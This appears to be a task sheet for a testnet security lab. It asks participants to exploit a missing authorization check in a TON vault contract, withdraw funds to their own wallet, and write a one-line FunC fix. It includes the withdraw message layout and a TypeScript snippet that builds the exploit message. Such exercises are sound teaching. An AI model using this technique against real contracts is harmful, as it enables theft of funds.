## Goal

1. Deposit is NOT required — ops pre-funds the vault
2. Exploit missing authorization to withdraw TON to **your** testnet wallet
3. Document root cause and provide a **one-line FunC fix**
4. Optional: deploy your own fixed version on testnet

## Message Format

Withdraw op:

```
op       = 0x1002 (32 bits)
amount   = Coins (var)
dest     = MsgAddress (your wallet)
```

Build body with `@ton/core`:

```typescript
import { beginCell, toNano, Address } from '@ton/core';

const body = beginCell()
  .storeUint(0x1002, 32)
  .storeCoins(toNano('0.05'))
  .storeAddress(Address.parse('YOUR_WALLET'))
  .endCell();
```

Send internal message to lab contract from any wallet.
